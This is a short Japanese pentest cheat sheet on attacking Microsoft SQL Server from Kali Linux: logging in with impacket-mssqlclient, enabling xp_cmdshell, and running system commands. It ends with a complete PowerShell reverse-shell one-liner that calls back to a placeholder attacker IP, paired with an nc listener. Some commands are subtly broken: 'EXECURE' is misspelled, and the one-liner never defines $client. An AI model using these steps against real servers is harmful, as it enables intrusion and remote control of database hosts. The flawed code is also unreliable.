# MSSQLにKali Linuxからログイン

`impacket-mssqlclient <DOMAIN>/<USERNAME>:<PASSWORD>`


# xp_cmdshell を使えるようにする

xp_cmdshell では受け取った文字列をコマンドプロンプトで実行できる。
ただし、デフォルトでは無効になっているので、有効に設定を変更する必要がある。

以下のコマンドを実行して、 xp_cmdshell を使えるようにする。

```
EXECUTE sp_configure 'show advanced options', 1;
RECONFIGURE;
EXECURE sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```


# xp_cmdshell でコマンドを実行する

```
EXECUTE xp_cmdshell 'whoami';
```

nt service\mssql$sqlexpress が返ってくるはず。  
コマンド部分にはリバースシェルのコマンドを入れることもできるので、Kali側で `nc -lvnp <LISTEN_PORT>` を実行した上で
```
xp_cmdshell 'New-Object System.Net.Sockets.TCPClient("<ATTACKER_IP>",<LISTEN_PORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()
```
をMSSQL側で実行することで、 mssql ユーザーとしてシェルを取得することができる。




